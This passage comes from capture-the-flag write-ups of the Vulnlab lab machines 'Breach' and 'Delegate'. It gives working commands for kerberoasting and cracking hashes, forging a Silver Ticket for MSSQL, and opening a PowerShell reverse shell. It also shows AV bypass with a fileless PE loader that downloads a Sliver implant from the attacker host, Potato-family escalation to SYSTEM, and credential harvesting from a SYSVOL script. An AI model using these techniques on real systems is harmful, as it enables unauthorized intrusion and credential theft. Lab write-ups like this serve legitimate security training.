<code>julia.wong</code> user node does not seem to have anything at first glance, though we can keep looking around for other user objects that may have other privileges.</p>\n<p>There are a few things that I like to do at this point - notably creating a user list of all the domain users (if one wasn’t acquired previously) and then using that to either kerberoast&#x2F;ASREProast. Since we have all of the domain objects in Bloodhound you could just write them into a text file, I also provided a one-liner that does an LDAP query and greps for all of the usernames.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ldapsearch -x -LLL -H ldap://breachdc.breach.vl -D &#x27;julia.wong@breach.vl&#x27; -b &#x27;DC=breach,DC=vl&#x27; -w &#x27;(JULIA.WONG PASSWORD)&#x27; | grep userPrincipalName | awk &#x27;&#123;print $2&#125;&#x27; | cut -d &#x27;@&#x27; -f 1 &gt; ul.txt</span><br></pre></td></tr></table></figure>\n\n<p>This should return a user list for all of the domain user objects that are within the AD environment. Let’s now use <code>GetUserSPNs</code> to test if any users are kerberoastable. Since we have access to LDAP, what the tool we’re about to use is doing is essentially fetching a password hash for user accounts linked to a Service Principal Name (SPN). If any users are able to have this password fetch, it will return an Kerberos TGS that is encrypted with the users password.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-GetUserSPNs breach.vl/&#x27;julia.wong&#x27;:&#x27;(JULIA.WONG PASSWORD)&#x27; -dc-ip 10.10.124.111 -request -usersfile ul.txt</span><br><span class=\"line\">......</span><br><span class=\"line\">$krb5tgs$23$*svc_mssql$BREACH.VL$svc_mssql*$da7e190c[...snip...]d20a2b</span><br></pre></td></tr></table></figure>\n\n<p>As you can see from the above, a valid TGS was retrieved for the user <code>svc_mssql</code>. We can attempt to crack this with <code>hashcat</code>. You can find a list of hash modes <a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">here</a> at the hashcat wiki. The specific hash type we have is TGS-REP Kerberos 5 e-Type 23, which is denoted as hash mode ID 13100.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">edad60ef4608feef54bb95ed7683b4169c4f356cc7417a869bd6a9cfca8094e081c733f9940f9a8fd3341a31d25f32cda8c70a8115e3389ef562549914dae6a78b2e036378b4dcbd20a2b:[...snip...]</span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br></pre></td></tr></table></figure>\n\n<p>From the above, we can that the password for <code>svc_mssql</code> was cracked successfully and you should have the plaintext password for the user.</p>\n<h1 id=\"Silver-Ticket-for-MSSQL-Takeover\"><a href=\"#Silver-Ticket-for-MSSQL-Takeover\" class=\"headerlink\" title=\"Silver Ticket for MSSQL Takeover\"></a>Silver Ticket for MSSQL Takeover</h1><p>If you take a look back at Bloodhound, this user node’s SPN seems to belong to <code>MSSQLSvc/breachdc.breach.vl:1433</code>.</p>\n<p><img src=\"/images/vulnlab/breach-vl/c.png\"></p>\n<p>This corresponds with the MSSQL service that is currently present on the domain controller. Given that we currently have credentials for this user, we could simply attempt to log in via their credentials and see what we can enumerate.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-mssqlclient breach.vl/&#x27;svc_mssql@breach.vl&#x27;:&#x27;(SVC_MSSQL PASSWORD)&#x27; -target-ip 10.10.105.115 -windows-auth</span><br><span class=\"line\"></span><br><span class=\"line\">SQL (BREACH\\svc_mssql  guest@master)&gt;</span><br></pre></td></tr></table></figure>\n\n<p>If you’ll notice we are logged in as <code>svc_mssql</code>, however we’re currently logged as the context of the Guest user. This means we won’t be able to execute commands via <code>xp_cmdshell</code> which is one of the valid ways to execute commands through MSSQL. We could enumerate the local machine with <code>xp_dirtree</code> and use MSSQL queries to query to database, however you would not find much to my knowledge.</p>\n<p>There’s an interesting exploit that I learned through my progression in AD pen-testing and it involves precisely what we have now - a service account to MSSQL as well as that account have an SPN set for MSSQL. We could perform what’s called a Silver Ticket attack, which is essentially impersonating the Administrator account to authenticate to MSSQL via a forged TGS. </p>\n<p>If all goes well, we should be able to pass the silver ticket through to MSSQL and authenticate in the context of the Administrator user. Although we will still be executing commands through <code>xp_cmdshell</code> or <code>xp_dirtree</code> as <code>svc_mssql</code>, the MSSQL client will assume that we are logged in as the Administrator.</p>\n<p>You can find the articles that I used for research into this <a href=\"https://blog.netwrix.com/2022/08/31/impersonating-service-accounts-with-silver-tickets/\">here</a> and <a href=\"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket\">here</a>.</p>\n<p>So there are a few things that we’ll need to perform this, notably:</p>\n<ul>\n<li>The NTLM hash of the <code>svc_mssql</code> account.</li>\n<li>The domain SID of the <code>svc_mssql</code> account.</li>\n<li>The SPN of the service we are requesting to.</li>\n<li>The name of the user we want to impersonate.</li>\n</ul>\n<p>This information is all easily accessible to us, excluding the NTLM hash of the service account. We do however already know their plaintext password, so we could just convert the plaintext to an NTLM hash. You can do so online, though I used <a href=\"https://codebeautify.org/ntlm-hash-generator\">this one</a> particularly.</p>\n<p>The domain SID is also in Bloodhound within the <code>svc_mssql</code> user node, which is <code>S-1-5-21-2330692793-3312915120-706255856</code>.</p>\n<p>SPNs are essentially just the service and the machine DNS name put together, meaning the SPN we are requesting for is <code>mssql/breachdc.breach.vl</code>. As for the username, we’re trying to impersonate the <code>Administrator</code>.</p>\n<p>We can use <code>impacket-ticketer</code> with all the information above to request a ticket for the specified SPN. With all the info taken into account, you should receive a command similar to the below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-ticketer -nthash 69596C7[...snip...]870E25A5C -domain-sid S-1-5-21-2330692793-3312915120-706255856 -dc-ip 10.10.105.115 -spn mssql/breachdc.breach.vl -domain breach.vl Administrator</span><br><span class=\"line\">......</span><br><span class=\"line\">[*] Saving ticket in Administrator.ccache</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, the ticket was saved as <code>Administrator.ccache</code>. We’ll now set this as our Kerberos authentication global variable and attempt to authenticate to MSSQL as the Administrator user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ export KRB5CCNAME=Administrator.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-mssqlclient -k breachdc.breach.vl -target-ip 10.10.105.115</span><br><span class=\"line\">SQL (BREACH\\Administrator  dbo@master)&gt;</span><br></pre></td></tr></table></figure>\n\n<p>It looks like we were successfully logged within the context of Administrator, let’s see if we can enable command execution.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (BREACH\\Administrator  dbo@master)&gt; enable_xp_cmdshell</span><br><span class=\"line\">[*] INFO(BREACHDC\\SQLEXPRESS): Line 185: Configuration option &#x27;show advanced options&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class=\"line\">[*] INFO(BREACHDC\\SQLEXPRESS): Line 185: Configuration option &#x27;xp_cmdshell&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class=\"line\">SQL (BREACH\\Administrator  dbo@master)&gt; xp_cmdshell whoami</span><br><span class=\"line\">output             </span><br><span class=\"line\">----------------   </span><br><span class=\"line\">breach\\svc_mssql   </span><br><span class=\"line\"></span><br><span class=\"line\">NULL</span><br></pre></td></tr></table></figure>\n\n<p>It seems as though we can! Now that we are able to do this, let’s see if we can execute any arbitrary commands to gain a reverse shell. I opted to use a base64’d powershell reverse shell that you can make via <a href=\"https://www.revshells.com/\">revshells.com</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (BREACH\\Administrator  dbo@master)&gt; xp_cmdshell powershell -e (POWERSHELL BASE64 REV SHELL ENCODED)</span><br><span class=\"line\">output                                                                             </span><br><span class=\"line\">--------------------------------------------------------------------------------   </span><br><span class=\"line\">#&lt; CLIXML                                                                          </span><br><span class=\"line\"></span><br><span class=\"line\">&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;&lt;S S=&quot;Error&quot;&gt;At line:1 char:1_x000D__x000A_&lt;/S&gt;&lt;S S=&quot;Error&quot;&gt;+ $client = New-Object System.Net.Sockets.TCPClient(&quot;10.8.0.173&quot;,9001); ..._x000D__x000A_&lt;/S&gt;&lt;S S=&quot;Error&quot;&gt;+ ~~~~~~~   </span><br><span class=\"line\"></span><br><span class=\"line\">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_&lt;/S&gt;&lt;S S=&quot;Error&quot;&gt;This script contains malicious content and has been blocked by your antivirus software._x000D__x000A_&lt;/S&gt;&lt;S S=&quot;Error&quot;&gt;    + CategoryInfo          : ParserError: (   </span><br><span class=\"line\"></span><br><span class=\"line\">:) [], ParentContainsErrorRecordException_x000D__x000A_&lt;/S&gt;&lt;S S=&quot;Error&quot;&gt;    + FullyQualifiedErrorId : ScriptContainedMaliciousContent_x000D__x000A_&lt;/S&gt;&lt;S S=&quot;Error&quot;&gt; _x000D__x000A_&lt;/S&gt;&lt;/Objs&gt;</span><br></pre></td></tr></table></figure>\n\n<p>If you’ll notice from the above command output, it seems that AV is enabled on this machine - meaning we can’t simply execute malicious files as we normally would.</p>\n<h1 id=\"Bypassing-AV-with-PE-Loaders\"><a href=\"#Bypassing-AV-with-PE-Loaders\" class=\"headerlink\" title=\"Bypassing AV with PE Loaders\"></a>Bypassing AV with PE Loaders</h1><p>Since this is a Windows 2022 Datacenter (which I found later on for Priv Esc), we could simply just upload a Havoc binary since the signatures for <a href=\"https://github.com/HavocFramework/Havoc\">Havoc C2</a> beacons are not considered malicious in this version of Windows. If you stood up a havoc server, you should be able to upload the demon x64 binary through MSSQL and execute it to get a reverse shell.</p>\n<p>I wanted to use a different exploit this time around though that involves using Sliver. There’s a really interesting loader that I learned to use recently for AV bypass - one that even works for the most recent version of Windows 11. This specific loader is called <a href=\"https://github.com/SaadAhla/FilelessPELoader\">FilelessPELoader</a>, and it requires a bit of signature detection obfuscation before utilizing it properly. Luckily enough, the author of this loader (seamys, all credit goes to him for the development of this loader) has made a relatively short walkthrough on how to do this that you can find <a href=\"https://youtu.be/NmB2MPAafTo?si=58ITZ4LFxG2DBc2t\">here</a>.</p>\n<p>So if you’ve followed the loader walkthrough video accordingly, you should have the executable compiled from Visual Studio. I’ll spin up a quick <a href=\"https://github.com/BishopFox/sliver\">Sliver C2</a> server and create an implant as well as start an MTLS listener.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver &gt; mtls</span><br><span class=\"line\">[*] Starting mTLS listener ...</span><br><span class=\"line\">[*] Successfully started job #1</span><br><span class=\"line\">sliver &gt; generate --mtls (YOUR IP) --os windows --format exe --arch amd64 --save (DIRECTORY) --name breach</span><br></pre></td></tr></table></figure>\n\n<p>Skipping symbol obfuscation with <code>--skip-symbols</code> shouldn’t matter here, though if you do run into problems with the loader feel free to set that to a newly generated binary.</p>\n<p>Next be sure to load this with the <code>aes.py</code> file that is provided in the FilelessPELoader GitHub repo, we can do this easily by running it with <code>python3 aes.py breach.exe</code>. This should generated the respective key files needed for the exploit.</p>\n<p>Now that all of the legwork is done, you should have four files within your directory - <code>breach.exe</code>, <code>cipher.bin</code>, <code>key.bin</code>, and finally your obfuscated loader that you compiled previously. Make sure to host your directory that contains these four files with a simple Python HTTP server at the port of your choosing. We’ll now head back to MSSQL and execute the commands needed to exploit this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (BREACH\\Administrator  dbo@master)&gt; xp_cmdshell powershell &quot;cd C:\\; mkdir temp; cd C:\\temp; curl http://(YOUR IP):9001/dazzad.exe -O dazzad.exe; .\\dazzad.exe (YOUR IP) 9001 cipher.bin key.bin&quot;</span><br></pre></td></tr></table></figure>\n\n<p>The above one-liner should create a temp directory in <code>C:\\</code> and download the loader, before finally executing the key files remotely based on your HTTP server.</p>\n<p><img src=\"/images/vulnlab/breach-vl/d.png\"></p>\n<p>As you can see after a bit of waiting, a session has been created as <code>svc_mssql</code>.</p>\n<h1 id=\"Exploiting-SeImpersonatePrivilege-Against-SYSTEM\"><a href=\"#Exploiting-SeImpersonatePrivilege-Against-SYSTEM\" class=\"headerlink\" title=\"Exploiting SeImpersonatePrivilege Against SYSTEM\"></a>Exploiting SeImpersonatePrivilege Against SYSTEM</h1><p>Now that we have code execution as <code>svc_mssql</code> on the remote system, we can look around to see if their are any binaries or privileges that we can exploit.</p>\n<p>Luckily enough, this should not be very difficult as we already contain a privilege that we exploited previously to impersonate Administrator on the MSSQL service. We can use this same privilege to impersonate SYSTEM on the local machine.</p>\n<p>Before we do this though, I want to detail why this exploit specifically works with a service account that has SeImpersonatePrivilege. Service accounts, by default, will have this privilege along with SeAssignPrimaryTokenPrivilege. Having SeImpersonatePrivilege essentially allows our service account to impersonate a user or specified user to perform actions on behalf of that user.</p>\n<p><img src=\"/images/vulnlab/breach-vl/e.png\"></p>\n<p>Exploiting this is relatively simple, as we can impersonate SYSTEM and authenticate to an evil named pipe that we create. We can direct this named pipe to a binary to execute, which will run in the context of SYSTEM.</p>\n<p>In the past and up until now, the easiest way was to utilize the Potato Family of exploits to impersonate and spawn this named pipe. As of today, most of the Potato family has been detected by Defender which renders most of the executables unusable with traditional means.</p>\n<p>Luckily enough since we currently have a session through an obfuscated payload that isn’t detected by Defender, we can execute these binaries through a .NET assembly that shouldn’t allow them to be detected from Defender’s behavioral detection. I tested this out with two different exploits in the Potato family, notably <a href=\"https://github.com/CCob/SweetPotato\">SweetPotato</a> and <a href=\"https://github.com/bugch3ck/SharpEfsPotato\">SharpEfsPotato</a>.</p>\n<p>You’ll need to compile both of these executables in Visual Studio on a Windows host before using it with Sliver.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ls | grep Potato</span><br><span class=\"line\">SharpEfsPotato.exe</span><br><span class=\"line\">SweetPotato.exe</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have either one of these executables, we can use Sliver’s built-in <code>execute-assembly</code> command to execute these binaries through a .NET assembly. This prevents us from needing to drop the binaries locally on the compromised machine.</p>\n<p>I’ve provided the arguments that you’ll need in order to execute either one of these exploits. Both will land you a new session as SYSTEM if exploited correctly. Remember to ensure that you still have your simple Python HTTP server running since the arguments passed into either exploit will be executing our loader from before.</p>\n<p>The first that I’ll show is using SharpEfsPotato to exploit this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (breach) &gt; execute-assembly SharpEfsPotato.exe &#x27;-p C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -a &quot;C:\\temp\\dazzad.exe (KALI IP) 9001 cipher.bin key.bin&quot;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Output:</span><br><span class=\"line\">SharpEfsPotato by @bugch3ck</span><br><span class=\"line\">  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.</span><br><span class=\"line\"></span><br><span class=\"line\">  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.</span><br><span class=\"line\"></span><br><span class=\"line\">[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/e5b2e9a2-d802-4d36-aeab-2e0e4482647b/\\e5b2e9a2-d802-4d36-aeab-2e0e4482647b\\e5b2e9a2-d802-4d36-aeab-2e0e4482647b</span><br><span class=\"line\">df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:</span><br><span class=\"line\">[x]RpcBindingSetAuthInfo failed with status 0x6d3</span><br><span class=\"line\">[+] Server connected to our evil RPC pipe</span><br><span class=\"line\">[+] Duplicated impersonation token ready for process creation</span><br><span class=\"line\">[+] Intercepted and authenticated successfully, launching program</span><br><span class=\"line\">[+] Process created, enjoy!</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Session b4eedc0a breach - 10.10.112.238:63780 (BREACHDC) - windows/amd64 - Sat, 29 Jun 2024 00:20:05 EDT</span><br></pre></td></tr></table></figure>\n\n<p>And the next that I’ll show is using SweetPotato to exploit the same functionality.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (breach) &gt; execute-assembly SweetPotato.exe &#x27;-p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a &quot;C:\\temp\\dazzad.exe (KALI IP) 9001 cipher.bin key.bin&quot; -e EfsRpc&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Output:</span><br><span class=\"line\">SweetPotato by @_EthicalChaos_</span><br><span class=\"line\">  Orignal RottenPotato code and exploit by @foxglovesec</span><br><span class=\"line\">  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery</span><br><span class=\"line\">  PrintSpoofer discovery and original exploit by @itm4n</span><br><span class=\"line\">  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam</span><br><span class=\"line\">[+] Attempting NP impersonation using method EfsRpc to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</span><br><span class=\"line\">[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/ad72050e-613c-4ae3-a1c0-1c8f6908f715/\\ad72050e-613c-4ae3-a1c0-1c8f6908f715\\ad72050e-613c-4ae3-a1c0-1c8f6908f715</span><br><span class=\"line\">[+] Server connected to our evil RPC pipe</span><br><span class=\"line\">[+] Duplicated impersonation token ready for process creation</span><br><span class=\"line\">[+] Intercepted and authenticated successfully, launching program</span><br><span class=\"line\">[+] Process created, enjoy!</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Session 4123ca51 breach - 10.10.112.238:63856 (BREACHDC) - windows/amd64 - Sat, 29 Jun 2024 00:24:18 EDT</span><br></pre></td></tr></table></figure>\n\n<p>Note that I needed to specify the exploit mode to <code>EfsRpc</code> as the other exploit modes should fail due to an unsuccessful authentication interceptions. I’ve found this to really only work consistently with <code>EfsRpc</code>.</p>\n<p><img src=\"/images/vulnlab/breach-vl/f.png\"></p>\n<p>As seen from the above, both have spawned a session as SYSTEM. This means that we can simply use either session and access the root flag within the Administrator’s Desktop directory.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (breach) &gt; use 4123ca51-3f10-4ee7-a5e5-7142245ad26a</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Active session breach (4123ca51-3f10-4ee7-a5e5-7142245ad26a)</span><br><span class=\"line\"></span><br><span class=\"line\">sliver (breach) &gt; cat &quot;C:\\Users\\Administrator\\Desktop\\root.txt&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">VL[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have read the root flag, we have successfully compromised this machine!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>I came back to this machine after not initially knowing what I was doing the first time around. I had completed it, but I didn’t really learn much from it. After about a few months of practicing red-teaming, I was more confident in what I was doing and put a lot of the resources that I had learned to the test. It seems that it paid off, which I’m satisfied with.</p>\n<p>Big thanks to xct for creating this machine, this machine was very fulfilling.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://wiki.vulnlab.com/guidance/medium/breach\">https://wiki.vulnlab.com/guidance/medium/breach</a><br><a href=\"https://github.com/Greenwolf/ntlm_theft\">https://github.com/Greenwolf/ntlm_theft</a><br><a href=\"https://www.kali.org/tools/responder/\">https://www.kali.org/tools/responder/</a><br><a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://www.kali.org/tools/bloodhound/\">https://www.kali.org/tools/bloodhound/</a><br><a href=\"https://blog.netwrix.com/2022/08/31/impersonating-service-accounts-with-silver-tickets/\">https://blog.netwrix.com/2022/08/31/impersonating-service-accounts-with-silver-tickets/</a><br><a href=\"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket\">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket</a><br><a href=\"https://codebeautify.org/ntlm-hash-generator\">https://codebeautify.org/ntlm-hash-generator</a><br><a href=\"https://www.revshells.com/\">https://www.revshells.com/</a><br><a href=\"https://github.com/HavocFramework/Havoc\">https://github.com/HavocFramework/Havoc</a><br><a href=\"https://github.com/SaadAhla/FilelessPELoader\">https://github.com/SaadAhla/FilelessPELoader</a><br><a href=\"https://www.youtube.com/watch?si=58ITZ4LFxG2DBc2t&v=NmB2MPAafTo&feature=youtu.be\">https://www.youtube.com/watch?si=58ITZ4LFxG2DBc2t&amp;v=NmB2MPAafTo&amp;feature=youtu.be</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://github.com/CCob/SweetPotato\">https://github.com/CCob/SweetPotato</a><br><a href=\"https://github.com/bugch3ck/SharpEfsPotato\">https://github.com/bugch3ck/SharpEfsPotato</a></p>\n"},{"title":"Delegate - Vulnlab","date":"2024-06-30T17:16:36.000Z","keywords":"Vulnlab, Medium, Windows","description":"Delegate is another AD machine that focuses more on your knowledge of how to exploit user privileges and traverse through an AD environment. The bulk of this machine will be done through AD, harboring some exploits such as unconstrained delegation and GenericWrite privileges.","cover":"/images/vulnlab/delegate-vl/delegate_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nDelegate is another AD machine that focuses more on your knowledge of how to exploit user privileges and traverse through an AD environment. The bulk of this machine will be done through AD, harboring some exploits such as unconstrained delegation and GenericWrite privileges.\n\n# Enumeration\n\nLet's start by doing our usual NMAP scans of the machine.\n\n```\n└─$ sudo nmap 10.10.87.35\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 00:50 EDT\nNmap scan report for delegate.vl (10.10.87.35)\nHost is up (0.11s latency).\nNot shown: 988 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 7.17 seconds\n```\n\nAs stated before in the introduction, this machine is strictly AD. This means we won't need to enumerate any form of web server to gain access to a user list.\n\nLet's run crackmapexec against the IP address to get the DNS name of the machine. Since this machine as ports 53 and 88, we can assume that it is a DC.\n\n```\n└─$ crackmapexec smb 10.10.87.35                                   \nSMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)\n```\n\nWe'll add the DNS name `dc1.delegate.vl` and `delegate.vl` to our `/etc/hosts` file.\n\nLet's look at SMB to see if there are any files that are being hosted that we can exfil to our Kali machine.\n\n```\n└─$ smbclient -L 10.10.87.35 -N          \n\nSharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nIPC$            IPC       Remote IPC\nNETLOGON        Disk      Logon server share \nSYSVOL          Disk      Logon server share\n```\n\nSince we have null authentication enabled to SMB, we can enumerate the shares without needing credentials. While the default shares seem to be the only shares on this machine, let's still see if there's anything within `NETLOGON` or `SYSVOL`.\n\n```\nsmb: \\delegate.vl\\scripts\\> ls\n  .                                   D        0  Sat Aug 26 08:45:24 2023\n  ..                                  D        0  Sat Aug 26 05:45:45 2023\n  users.bat                           A      159  Sat Aug 26 08:54:29 2023\n\n5242879 blocks of size 4096. 1932408 blocks available\nsmb: \\delegate.vl\\scripts\\> get users.bat\ngetting file \\delegate.vl\\scripts\\users.bat of size 159 as users.bat (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)\n```\n\nI found an interesting `users.bat` file in the startup script folder in `SYSVOL`. Let's pull this down to our local machine to see if it contains any information.\n\n```\n└─$ cat users.bat               \nrem @echo off\nnet use * /delete /y\nnet use v: \\\\dc1\\development \n\nif %USERNAME%==A.Briggs net use h: \\\\fileserver\\backups /user:Administrator [...snip...]\n```\n\nAs you can see from the above, it seems as though we have a user that is accessing a share in their startup script and accessing the backup share in the fileserver as an Administrator.\n\nAssuming that this password is associated with this user, let's run crackmapexec to see if their password is a match.\n\n```\n└─$ crackmapexec smb 10.10.87.35 -u 'A.Briggs' -p '[...snip...]'\nSMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)\nSMB         10.10.87.35     445    DC1              [+] delegate.vl\\A.Briggs:[...snip...]\n\n└─$ crackmapexec ldap 10.10.87.35 -u 'A.Briggs' -p '[...snip...]'\nSMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.87.35     389    DC1              [+] delegate.vl\\A.Briggs:[...snip...]\n```\n\nIt seems as though this is a valid domain user, who has access to both LDAP and SMB. Since we have access to LDAP, we can dump the domain as this user to view all of the domain objects. Let's use Bloodhound with the [Python ingestor](https://github.com/dirkjanm/BloodHound.py) to do this.\n\n```\n└─$ bloodhound-python -d 'delegate.vl' -u 'A.Briggs' -p '(A.BRIGGS PASSWORD)' -c all -ns 10.10.87.35 --zip\n```\n\nThis should return a compressed archive containing all of the domain objects within the AD environment. We'll start up `neo4j` along with the `Bloodhound` GUI in order to view this in a graph.\n\n# GenericWrite over N.Thompson\n\nI did some initial enumeration of the domain objects, specifically the node for `A.Briggs` and what they have access to. It seems they have an interesting outbound object control on another node.\n\n![](/images/vulnlab/delegate-vl/b.png)\n\nFrom the screenshot above, it seems as though we have GenericWrite over the user `N.Thompson`.\n\nThis is much different than what we know about having GenericWrite or GenericAll on a node in the past. For some of my other writeups, we often had these privileges on a domain computer. The process for exploiting this against a domain user is much different - though it is simpler in my opinion.\n\nIf we have GenericWrite over a domain user object, there is a Kerberos exploit we could do. We could perform [targeted Kerberoasting](https://github.com/ShutdownRepo/targetedKerberoast) on the domain object to request a TGS on behalf of them. This TGT will be encrypted with their password, which we can attempt to crack offline.\n\nYou can do this with the GitHub repository provided above. An example command can be found below.\n\n```\n└─$ python3 targetedKerberoast.py -d 'delegate.vl' -u 'A.Briggs' -p '(A.BRIGGS PASSWORD)' --request-user 'N.Thompson'\n[*] Starting kerberoast attacks\n[*] Attacking user (N.Thompson)\n[+] Printing hash for (N.Thompson)\n$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$99c33fd94eb13970a6963667b7589c0a$29314c913d36f[...snip...]88b9ec9b2f6cd7e7f190edb308d9f\n```\n\nAs you can see, this returned a valid TGS for the `N.Thompson` user. I did not need to update any of the dependencies needed for this, though it may be different for you.\n\nLet's now use [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes) with a hash-identifier of 13100 to attempt to decrypt this hash.\n\n```\n└─$ hashcat -a 0 -m 13100 nthompson.txt /usr/share/wordlists/rockyou.txt\n......\nf81d26ea14e743da90803146fc62ee86195ff78c872e0422bfb05fcb74c9ec6337b612aaa6338382da5ee166bffe0d275685ab7388b9ec9b2f6cd7e7f190edb308d9f:[...snip...]\n\nSession..........: hashcat\nStatus...........: Cracked\n```\n\nAs you can see from the above, the password was cracked successfully. We can now use this with crackmapexec to see if `N.Thompson` has any valid authentication to any other resources.\n\n![](/images/vulnlab/delegate-vl/c.png)\n\nIt seems as though `N.Thompson` is a part of the `Remote Management Users` group. From my first guess, this means that they can PSRemote into the machine (meaning they have RDP access).\n\n```\n└─$ crackmapexec winrm 10.10.87.35 -u 'N.Thompson' -p '[...snip...]'\nSMB         10.10.87.35     5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)\nHTTP        10.10.87.35     5985   DC1              [*] http://10.10.87.35:5985/wsman\nWINRM       10.10.87.35     5985   DC1              [+] delegate.vl\\N.Thompson:[...snip...] (Pwn3d!)\n```\n\nIt seems as though we have the ability to WinRM into the machine. Let's do so with `evil-winrm`.\n\n```\n└─$ evil-winrm --ip 10.10.87.35 -u 'N.Thompson' -p '(N.THOMPSON PASSWORD)'\n\nEvil-WinRM shell v3.5\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine               \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents> whoami\ndelegate\\n.thompson\n*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents> hostname\nDC1\n```\n\nThe first user flag is within their home directory, denoted path as `C:\\Users\\N.Thompson\\Desktop\\user.txt`.\n\n# SeEnableDelegationPrivilege and MAQs\n\nI decided not to use Sliver for this, as it really isn't needed aside from transferring files to the machine easily. We'll be doing the rest of this solely from the WinRM session that we have.\n\nIf you run `whoami /priv`, you'll notice an interesting privilege that has been enabled for `N.Thompson`.\n\n```\n*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                                                    State\n============================= ============================================================== =======\nSeMachineAccountPrivilege     Add workstations to domain                                     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking                                       